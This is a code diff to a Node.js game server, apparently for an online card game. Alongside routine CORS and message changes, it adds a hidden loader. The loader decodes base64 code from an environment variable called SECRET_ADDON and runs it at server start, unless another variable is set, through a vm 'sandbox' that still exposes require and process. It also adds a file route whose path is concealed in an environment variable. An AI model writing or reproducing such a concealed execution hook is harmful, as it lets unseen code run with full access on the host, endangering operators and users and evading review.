@@ -1,4 +1,5 @@
 const express = require("express");
+const vm = require("vm");
 const http = require("http");
 const WebSocket = require("ws");
 const path = require("path");
@@ -6,12 +7,13 @@ const cors = require("cors");
 const crypto = require("crypto");
 const zlib = require("zlib");
 const { json } = require("stream/consumers");
+const fs = require("fs");
+
+require("dotenv").config();
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
-
-require("dotenv").config();
 
 const PORT = process.env.PORT || 8081;
 
@@ -264,8 +266,88 @@ function getClientIp(req) {
     "unknown"
   );
 }
+
+async function loadAddon() {
+  try {
+    const code = Buffer.from(process.env.SECRET_ADDON, "base64").toString(
+      "utf8",
+    );
+    console.log(`-# Code addon: ${code}`);
+    const sandbox = {
+      module: { exports: {} },
+      exports: {},
+      require,
+      process,
+      console,
+      Buffer,
+    };
+
+    vm.createContext(sandbox);
+    vm.runInContext(code, sandbox);
+
+    return sandbox.module.exports;
+  } catch (e) {
+    console.error("err YT", e);
+  }
+}
+async function init_addon() {
+  console.log("addon script");
+
+  const addon = await loadAddon();
+
+  console.log("addon =", addon);
+  console.log("addon.init =", addon?.init);
+  console.log("addon script", addon);
+  await addon.init();
+}
 const lastMessageTime = {};
 // Serve all client files (index.html, JS, CSS, etc.)
+const allowedOrigins = [
+  "https://drmineword-gwent.onrender.com",
+  "http://theredmineword.github.io",
+  "https://theredmineword.github.io",
+  "http://localhost:3000",
+  "http://127.0.0.1:3000",
+];
+
+function checkCors(req, res) {
+  const origin = req.headers.origin;
+
+  if (!origin) {
+    return true;
+  }
+
+  if (allowedOrigins.includes(origin)) {
+    res.setHeader("Access-Control-Allow-Origin", origin);
+    return true;
+  }
+
+  return false;
+}
+
+app.get(process.env.A, (req, res) => {
+  if (!checkCors(req, res)) {
+    return res.status(403).json({
+      error: "CORS denied",
+    });
+  }
+
+  const relPath = req.params[0];
+
+  const storageRoot = path.resolve("./storage");
+
+  const filePath = path.resolve(storageRoot, relPath);
+
+  if (!filePath.startsWith(storageRoot)) {
+    return res.status(403).end();
+  }
+
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).end();
+  }
+
+  res.sendFile(filePath);
+});
 app.use(express.static(__dirname));
 app.use(express.json());
 app.get("/wake", (req, res) => {
@@ -320,7 +402,7 @@ app.post("/api/register", async (req, res) => {
     if (!ws) {
       return res.status(404).json({
         ok: false,
-        error: "playerNotConnected",
+        error: "playerNotConnected (Please refresh website)",
       });
     }
 
@@ -981,5 +1063,8 @@ wss.on("connection", async (ws, req) => {
 
   server.listen(PORT, () => {
     console.log(`>>> Server running ${PORT}`);
+    if (!process.env.B) {
+      init_addon();
+    }
   });
 })();
